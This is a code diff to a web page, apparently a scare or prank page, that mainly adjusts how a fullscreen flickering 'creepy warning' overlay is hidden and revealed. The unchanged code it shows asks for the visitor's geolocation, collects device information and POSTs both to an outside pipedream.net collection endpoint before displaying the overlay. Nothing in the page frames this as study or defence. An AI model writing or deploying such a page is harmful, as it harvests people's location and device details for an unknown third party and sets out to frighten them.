@@ -19,7 +19,7 @@
       font-family: Arial, sans-serif;
     }
 
-    /* Fullscreen creepy warning, initially hidden */
+    /* Fullscreen creepy warning */
     #warning {
       position: fixed;
       top: 0;
@@ -27,7 +27,7 @@
       height: 100vh;
       width: 100vw;
       background-color: darkred;
-      display: flex;
+      display: none; /* start hidden */
       justify-content: center;
       align-items: center;
       color: white;
@@ -36,13 +36,9 @@
       z-index: 9999;
       font-size: 10vw;
       line-height: 1.2;
-      opacity: 0;          /* start hidden */
-      pointer-events: none; /* ignore clicks until shown */
-      transition: opacity 0.5s ease-in-out;
       animation: flicker 1.5s infinite;
     }
 
-    /* Flicker effect */
     @keyframes flicker {
       0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
       20%, 22%, 24%, 55% { opacity: 0.2; }
@@ -91,12 +87,11 @@
       };
     }
 
-    // Request geolocation
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
           const deviceInfo = getDeviceInfo();
-          // Send data
+          // Send coordinates + device info
           fetch("https://eo6f81z4derf3yg.m.pipedream.net", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -109,10 +104,9 @@
           });
           console.log("Coords + device info sent!");
 
-          // SHOW warning overlay
+          // SHOW the warning overlay
           const warning = document.getElementById('warning');
-          warning.style.opacity = '1';
-          warning.style.pointerEvents = 'auto';
+          warning.style.display = 'flex';  // use flex to make it appear properly
         },
         (err) => console.error("Geo error:", err)
       );
